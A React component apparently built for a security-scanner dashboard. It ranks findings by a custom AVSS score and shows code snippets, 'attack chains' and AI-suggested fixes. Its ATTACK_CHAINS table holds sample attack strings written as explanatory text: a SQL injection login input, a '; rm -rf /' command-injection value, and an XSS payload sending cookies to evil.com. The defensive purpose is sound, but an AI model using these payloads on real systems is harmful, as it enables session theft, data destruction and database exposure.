/**
 * DeepDive.tsx
 * Judge-facing "Focus mode" — takes the top 1-3 findings by AVSS score
 * and gives each one a full detailed treatment.
 * Designed to be readable on a projector / shared screen.
 */
import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import {
  avss, scoreColor, severityBucket, BUCKET_COLOR,
  type Finding, type Sector,
} from "@/lib/scan-data";
import { apiPath } from "@/lib/api";

// ── Syntax highlight ──────────────────────────────────────────────────────────
function Code({ code }: { code: string }) {
  const parts = code.split(/(".*?"|'.*?'|`.*?`)/g);
  return (
    <>
      {parts.map((p, i) =>
        /^["'`]/.test(p) ? (
          <span key={i} style={{ color: "var(--sev-low)" }}>{p}</span>
        ) : (
          <span key={i}>
            {p.split(/\b(const|let|var|await|return|if|else|new|function|async|import|export|from)\b/g)
              .map((w, j) =>
                /^(const|let|var|await|return|if|else|new|function|async|import|export|from)$/.test(w)
                  ? <span key={j} className="text-primary/80">{w}</span>
                  : <span key={j}>{w}</span>
              )}
          </span>
        )
      )}
    </>
  );
}

// ── Vulnerability type → human label ─────────────────────────────────────────
const TYPE_LABELS: Record<string, { label: string; short: string }> = {
  "phi-log-leak":            { label: "PHI Log Leak",            short: "PHI Leak" },
  "hardcoded-secret":        { label: "Hardcoded Secret",        short: "Secret" },
  "card-number-exposure":    { label: "Card Number (Luhn ✓)",    short: "Card PAN" },
  "raw-cvv-pin-exposure":    { label: "Raw CVV / PIN",           short: "CVV/PIN" },
  "price-manipulation":      { label: "Price Manipulation",      short: "Price Manip" },
  "sql-injection":           { label: "SQL Injection",           short: "SQLi" },
  "cross-site-scripting":    { label: "Cross-Site Scripting",    short: "XSS" },
  "insecure-deserialization":{ label: "Insecure Deserialization",short: "Unsafe Deser" },
  "missing-authentication":  { label: "Missing Authentication",  short: "No Auth" },
  "command-injection":       { label: "Command Injection",       short: "Cmd Inject" },
  "path-traversal":          { label: "Path Traversal",          short: "Path Trav" },
  "ssrf":                    { label: "SSRF",                    short: "SSRF" },
  "vulnerable-dependency":   { label: "Vulnerable Dependency",   short: "CVE Dep" },
  "generic-sast-finding":    { label: "SAST Finding",            short: "SAST" },
};

function getTypeLabel(type?: string): { label: string; short: string } {
  if (!type) return { label: "Unknown", short: "?" };
  for (const [key, val] of Object.entries(TYPE_LABELS)) {
    if (type === key || type.includes(key)) return val;
  }
  return { label: type.replace(/-/g, " ").replace(/\b\w/g, c => c.toUpperCase()), short: type.split("-")[0] ?? type };
}

// ── Score ring ────────────────────────────────────────────────────────────────
function ScoreRing({ score, label }: { score: number; label: string }) {
  const bucket = severityBucket(score);
  const color  = BUCKET_COLOR[bucket];
  const pct    = (score / 10) * 283; // circumference of r=45 circle
  return (
    <div className="flex flex-col items-center gap-1">
      <div className="relative h-24 w-24">
        <svg viewBox="0 0 100 100" className="h-full w-full -rotate-90">
          <circle cx="50" cy="50" r="45" fill="none" stroke="var(--muted)" strokeWidth="8" />
          <motion.circle
            cx="50" cy="50" r="45" fill="none"
            stroke={color} strokeWidth="8"
            strokeLinecap="round"
            strokeDasharray="283"
            initial={{ strokeDashoffset: 283 }}
            animate={{ strokeDashoffset: 283 - pct }}
            transition={{ duration: 1, ease: "easeOut" }}
          />
        </svg>
        <div className="absolute inset-0 flex flex-col items-center justify-center">
          <span className="font-mono text-2xl font-black" style={{ color }}>{score.toFixed(1)}</span>
        </div>
      </div>
      <span className="font-mono text-[10px] tracking-widest text-muted-foreground uppercase">{label}</span>
    </div>
  );
}

// ── Attack chain step ─────────────────────────────────────────────────────────
const ATTACK_CHAINS: Record<string, string[]> = {
  "phi-log-leak":         ["Attacker gains log access (leaked creds, insider)", "Reads plaintext patient_id / diagnosis from logs", "Sells PHI on dark web or uses for targeted fraud", "Regulator notified — HIPAA breach, DPDP penalty"],
  "hardcoded-secret":     ["Developer commits AWS/API key to repo", "Repo scraped by secret-scanning bots within minutes", "Attacker authenticates with stolen key", "Full cloud account takeover — all data exfiltrated"],
  "card-number-exposure": ["Source code or logs containing PAN are accessed", "Luhn-valid card number extracted (confirmed by AVSS)", "Card-not-present fraud immediately possible", "PCI-DSS forensic audit triggered — $50k–$200k cost"],
  "raw-cvv-pin-exposure": ["CVV literal found in source/config", "Attacker uses CVV for online transactions", "PCI-DSS Req 3.2.1 violation — no grace period", "Card network revokes merchant processing rights"],
  "price-manipulation":   ["Attacker opens browser DevTools on checkout page", "Modifies JS variable: total_price = 0.01", "Submits order — no server-side validation", "Goods shipped for ₹0 — direct revenue loss"],
  "sql-injection":        ["Attacker sends: ' OR '1'='1 in login field", "Database returns all user records", "Admin credentials extracted", "Full database dump — all user PII exposed"],
  "command-injection":    ["Attacker sends: ; rm -rf / in filename field", "Server executes as app service account", "All files deleted or ransomware installed", "Complete server compromise"],
  "vulnerable-dependency":["CVE advisory published for dependency version", "Automated scanners probe every reachable endpoint", "Known exploit chain executed against unpatched app", "Data breach without any custom vulnerability"],
  "cross-site-scripting": ["Attacker injects: <script>fetch('evil.com/'+document.cookie)</script>", "Stored in database — runs for every user who views it", "Session cookies stolen → account hijacked", "Worm-like spread if self-replicating payload"],
};

function getAttackChain(type: string): string[] {
  for (const [key, steps] of Object.entries(ATTACK_CHAINS)) {
    if (type.includes(key) || key.includes(type.split("-")[0] ?? "")) return steps;
  }
  return ["Vulnerability detected by AVSS scanner", "Attacker identifies and targets the weakness", "Data or system compromised", "Regulatory and financial consequences follow"];
}

// ── AI fix state per finding ──────────────────────────────────────────────────
type FixData = {
  analysis: string;
  criticality: string;
  consequences: string[];
  diff: { sign: string; code: string }[];
  fixNote: string;
  postFixScore: number;
  scoreReduction: number;
  aiPowered: boolean;
};

// ── Single deep-dive card ─────────────────────────────────────────────────────
function FindingCard({
  f,
  sector,
  rank,
  onFixApplied,
}: {
  f: Finding;
  sector: Sector;
  rank: number;
  onFixApplied: (id: string, postFixScore: number) => void;
}) {
  const [fixData,     setFixData]     = useState<FixData | null>(null);
  const [loadingFix,  setLoadingFix]  = useState(false);
  const [fixApplied,  setFixApplied]  = useState(!!f.fixApplied);

  const liveScore   = avss(f, sector);
  const bucket      = severityBucket(liveScore);
  const baseScore   = f.baseSeverity ?? f.baseline ?? 0;
  const attackChain = getAttackChain(f.type ?? "");

  // Auto-sync fixApplied if parent updates the finding
  useEffect(() => { setFixApplied(!!f.fixApplied); }, [f.fixApplied]);

  const loadFix = async () => {
    if (fixData || loadingFix) return;
    setLoadingFix(true);
    try {
      const snippetCode = f.snippet?.map(l => l.code).join("\n") ?? "";
      const res = await fetch(apiPath("/suggest-fix"), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ finding: { ...f, codeSnippet: snippetCode } }),
      });
      if (res.ok) setFixData(await res.json());
    } catch (e) { console.error(e); }
    finally { setLoadingFix(false); }
  };

  const applyFix = () => {
    if (!fixData) return;
    onFixApplied(f.id, fixData.postFixScore);
    setFixApplied(true);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 16 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: rank * 0.1 }}
      className="rounded-2xl border border-border bg-panel/60 overflow-hidden"
    >
      {/* ── Card header ── */}
      <div className="flex flex-wrap items-center gap-4 border-b border-border px-6 py-5"
        style={{ background: `color-mix(in oklab, ${BUCKET_COLOR[bucket]} 6%, transparent)` }}>
        <div className="flex h-8 w-8 items-center justify-center rounded-full font-mono text-sm font-black"
          style={{ background: BUCKET_COLOR[bucket], color: "#000" }}>
          {rank + 1}
        </div>
        <div className="flex-1 min-w-0">
          <div className="flex flex-wrap items-center gap-2 mb-0.5">
            <p className="text-base font-semibold text-foreground truncate">{f.title}</p>
            {/* Vulnerability type badge */}
            <span
              className="shrink-0 rounded-md border px-2 py-0.5 font-mono text-[10px] font-bold uppercase tracking-wider"
              style={{ color: BUCKET_COLOR[bucket], borderColor: `color-mix(in oklab, ${BUCKET_COLOR[bucket]} 50%, transparent)`, background: `color-mix(in oklab, ${BUCKET_COLOR[bucket]} 10%, transparent)` }}>
              {getTypeLabel(f.type).label}
            </span>
          </div>
          <p className="font-mono text-[11px] text-muted-foreground">
            {f.filePath}{f.lineNumber ? `:${f.lineNumber}` : ""} · {f.source ?? f.tool ?? "unknown"}
            {f.cveId && <span className="ml-2">{f.cveId}</span>}
          </p>
        </div>
        {fixApplied && (
          <motion.span
            initial={{ opacity: 0, scale: 0.8 }} animate={{ opacity: 1, scale: 1 }}
            className="rounded-full px-3 py-1 font-mono text-xs font-bold"
            style={{ background: "color-mix(in oklab, var(--sev-low) 15%, transparent)", color: "var(--sev-low)" }}>
            ✓ Fixed
          </motion.span>
        )}
      </div>

      {/* ── Body ── */}
      <div className="grid gap-6 p-6 lg:grid-cols-[1fr_1fr]">

        {/* LEFT: scores + code */}
        <div className="space-y-5">
          {/* Score comparison */}
          <div className="space-y-3">
            <div className="flex items-center gap-8">
              <ScoreRing score={baseScore} label="CVSS baseline" />
              <div className="flex flex-col items-center gap-1 font-mono">
                <motion.div
                  initial={{ scaleX: 0 }} animate={{ scaleX: 1 }}
                  transition={{ delay: 0.5, duration: 0.6 }}
                  className="h-0.5 w-16 origin-left"
                  style={{ background: BUCKET_COLOR[bucket] }} />
                <span className="text-[10px] font-bold" style={{ color: BUCKET_COLOR[bucket] }}>
                  ×{(liveScore / Math.max(baseScore, 0.1)).toFixed(1)}
                </span>
                <span className="text-[9px] text-muted-foreground">sector weight</span>
              </div>
              <ScoreRing score={liveScore} label="AVSS score" />
            </div>
            {/* Vulnerability type label below rings */}
            <div className="flex items-center gap-2">
              <span className="font-mono text-[10px] text-muted-foreground uppercase tracking-widest">Vuln type</span>
              <span
                className="rounded-md px-2.5 py-1 font-mono text-[11px] font-bold"
                style={{
                  color: BUCKET_COLOR[bucket],
                  background: `color-mix(in oklab, ${BUCKET_COLOR[bucket]} 12%, transparent)`,
                }}>
                {getTypeLabel(f.type).label}
              </span>
              <span className="font-mono text-[10px] text-muted-foreground">·</span>
              <span className="font-mono text-[10px] text-muted-foreground capitalize">{severityBucket(liveScore)}</span>
            </div>
          </div>

          {/* Formula breakdown */}
          <div className="rounded-xl border border-border bg-background/40 px-4 py-3 font-mono text-[11px] space-y-1.5">
            <p className="text-muted-foreground tracking-widest uppercase text-[9px] mb-2">AVSS formula</p>
            <p className="text-foreground">
              {baseScore.toFixed(1)}
              <span className="text-muted-foreground"> × (1 + {(f.epssScore ?? 0).toFixed(3)})</span>
              <span style={{ color: "var(--sev-medium)" }}> × {
                { healthcare: "1.6", fintech: "1.5", ecommerce: "1.3", general: "1.0" }[sector]
              }×</span>
              <span style={{ color: "var(--sev-high)" }}> × {f.regulatoryTag ? "1.7–1.8" : "1.0"}×</span>
              <span className="text-primary"> = {liveScore.toFixed(1)}</span>
            </p>
            {f.epssScore != null && (
              <p className="text-muted-foreground">
                EPSS <span className="text-primary">{(f.epssScore * 100).toFixed(1)}%</span> exploitation probability (FIRST.org)
              </p>
            )}
            {(f.regulatoryTag ?? f.citations?.[sector]) && (
              <p className="text-muted-foreground">
                Regulation: <span className="text-foreground">{f.citations?.[sector] ?? f.regulatoryTag}</span>
              </p>
            )}
          </div>

          {/* Code snippet */}
          {f.snippet && f.snippet.length > 0 && (
            <div className="overflow-hidden rounded-xl border border-border bg-panel/60">
              <p className="border-b border-border px-3 py-1.5 font-mono text-[10px] tracking-widest text-muted-foreground uppercase">Vulnerable code</p>
              {f.snippet.map((l) => (
                <div key={l.n}
                  className={`flex gap-3 px-3 py-1 font-mono text-[11.5px] ${l.n === f.lineNumber ? "bg-sev-critical/10" : ""}`}>
                  <span className="w-8 shrink-0 text-right text-muted-foreground/50">{l.n}</span>
                  <span className="whitespace-pre-wrap text-foreground/90"><Code code={l.code} /></span>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* RIGHT: attack chain + fix */}
        <div className="space-y-5">
          {/* Attack chain */}
          <div className="rounded-xl border border-border bg-panel/60 overflow-hidden">
            <p className="border-b border-border px-4 py-2.5 font-mono text-[10px] tracking-widest text-muted-foreground uppercase">
              Attack chain
            </p>
            <div className="p-4 space-y-0">
              {attackChain.map((step, i) => (
                <motion.div
                  key={i}
                  initial={{ opacity: 0, x: -8 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: 0.2 + i * 0.1 }}
                  className="flex gap-3"
                >
                  <div className="flex flex-col items-center">
                    <div className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full font-mono text-[10px] font-bold text-background"
                      style={{ background: i === 0 ? "var(--muted-foreground)" : i === attackChain.length - 1 ? BUCKET_COLOR.critical : BUCKET_COLOR[bucket] }}>
                      {i + 1}
                    </div>
                    {i < attackChain.length - 1 && (
                      <div className="mt-1 mb-1 w-px flex-1 min-h-[16px]" style={{ background: "var(--border)" }} />
                    )}
                  </div>
                  <p className={`pb-3 text-xs leading-relaxed ${i === attackChain.length - 1 ? "font-medium" : "text-foreground/80"}`}
                    style={{ color: i === attackChain.length - 1 ? BUCKET_COLOR.critical : undefined }}>
                    {step}
                  </p>
                </motion.div>
              ))}
            </div>
          </div>

          {/* Evidence */}
          {f.evidence && (
            <div className="rounded-xl border border-border bg-panel/60 px-4 py-3 space-y-1">
              <p className="font-mono text-[10px] tracking-widest text-muted-foreground uppercase">Evidence</p>
              <p className="text-xs text-foreground">{f.evidence}</p>
            </div>
          )}

          {/* AI Fix */}
          {!fixApplied ? (
            <div className="space-y-3">
              {!fixData && (
                <button onClick={loadFix} disabled={loadingFix}
                  className="w-full rounded-xl border border-primary/40 bg-primary/10 py-2.5 font-mono text-xs font-bold text-primary hover:bg-primary/20 transition-colors disabled:opacity-50">
                  {loadingFix ? "Generating AI fix…" : "Generate AI-suggested fix"}
                </button>
              )}
              <AnimatePresence>
                {fixData && (
                  <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} className="space-y-3">
                    {/* Diff */}
                    <div className="overflow-hidden rounded-xl border border-border">
                      <div className="flex items-center justify-between border-b border-border bg-panel/60 px-4 py-2.5">
                        <p className="font-mono text-[10px] tracking-widest text-muted-foreground uppercase">
                          Suggested fix {fixData.aiPowered && <span className="ml-1 text-primary">· AI</span>}
                        </p>
                        <button onClick={applyFix}
                          className="rounded-lg bg-primary px-4 py-1.5 font-mono text-[11px] font-bold text-background hover:bg-primary/90 transition-colors">
                          Apply → update dashboard
                        </button>
                      </div>
                      <div className="bg-panel/40">
                        {fixData.diff.map((d, i) => (
                          <div key={i} className="flex gap-3 px-3 py-1 font-mono text-[11.5px]"
                            style={{
                              background: d.sign === "+" ? "color-mix(in oklab, var(--sev-low) 12%, transparent)"
                                : d.sign === "-" ? "color-mix(in oklab, var(--sev-critical) 12%, transparent)"
                                : "transparent",
                            }}>
                            <span className="w-3 shrink-0"
                              style={{ color: d.sign === "+" ? "var(--sev-low)" : d.sign === "-" ? "var(--sev-critical)" : "var(--muted-foreground)" }}>
                              {d.sign}
                            </span>
                            <span className="whitespace-pre-wrap text-foreground/90"><Code code={d.code} /></span>
                          </div>
                        ))}
                      </div>
                      {fixData.fixNote && (
                        <p className="border-t border-border px-4 py-2.5 text-xs text-muted-foreground">{fixData.fixNote}</p>
                      )}
                    </div>
                    {/* Score preview */}
                    <div className="flex items-center gap-4 rounded-xl border px-5 py-3"
                      style={{
                        borderColor: "color-mix(in oklab, var(--sev-low) 30%, transparent)",
                        background:  "color-mix(in oklab, var(--sev-low) 6%, transparent)",
                      }}>
                      <span className="font-mono text-lg font-black" style={{ color: BUCKET_COLOR[bucket] }}>{liveScore.toFixed(1)}</span>
                      <span className="text-muted-foreground font-mono">→</span>
                      <span className="font-mono text-lg font-black" style={{ color: "var(--sev-low)" }}>{fixData.postFixScore.toFixed(1)}</span>
                      <span className="font-mono text-xs font-bold ml-auto" style={{ color: "var(--sev-low)" }}>
                        −{fixData.scoreReduction.toFixed(1)} after fix
                      </span>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          ) : (
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}
              className="rounded-xl border px-5 py-4 flex items-center gap-3"
              style={{ borderColor: "color-mix(in oklab, var(--sev-low) 35%, transparent)", background: "color-mix(in oklab, var(--sev-low) 8%, transparent)" }}>
              <span className="text-xl" style={{ color: "var(--sev-low)" }}>✓</span>
              <div>
                <p className="font-mono text-xs font-bold" style={{ color: "var(--sev-low)" }}>Fix applied</p>
                <p className="font-mono text-[10px] text-muted-foreground mt-0.5">
                  Score updated to {(f.postFixScore ?? 0).toFixed(1)} — stats bar and heatmap updated
                </p>
              </div>
            </motion.div>
          )}
        </div>
      </div>
    </motion.div>
  );
}

// ── Main export ───────────────────────────────────────────────────────────────
export function DeepDive({
  findings,
  sector,
  applied,
  onFixApplied,
}: {
  findings: Finding[];
  sector: Sector;
  applied: boolean;
  onFixApplied: (id: string, postFixScore: number) => void;
}) {
  const [count, setCount] = useState<1 | 2 | 3>(3);

  // Pick top N by AVSS score
  const top = [...findings]
    .sort((a, b) => avss(b, sector) - avss(a, sector))
    .slice(0, count);

  if (findings.length === 0) return null;

  return (
    <div className="space-y-5">
      {/* Controls */}
      <div className="flex flex-wrap items-center justify-between gap-3">
        <div>
          <h2 className="text-sm font-semibold text-foreground">Deep dive — top vulnerabilities</h2>
          <p className="mt-0.5 font-mono text-[11px] text-muted-foreground">
            Showing top {count} by AVSS score · full attack chain · AI-suggested fix
          </p>
        </div>
        <div className="flex items-center gap-1 rounded-xl border border-border bg-panel/60 p-1">
          {([1, 2, 3] as const).map((n) => (
            <button key={n} onClick={() => setCount(n)}
              className={`rounded-lg px-4 py-1.5 font-mono text-xs font-bold transition-colors ${
                count === n ? "bg-primary text-background" : "text-muted-foreground hover:text-foreground"
              }`}>
              Top {n}
            </button>
          ))}
        </div>
      </div>

      {/* Cards */}
      <div className="space-y-6">
        {top.map((f, i) => (
          <FindingCard
            key={f.id}
            f={f}
            sector={sector}
            rank={i}
            onFixApplied={onFixApplied}
          />
        ))}
      </div>
    </div>
  );
}
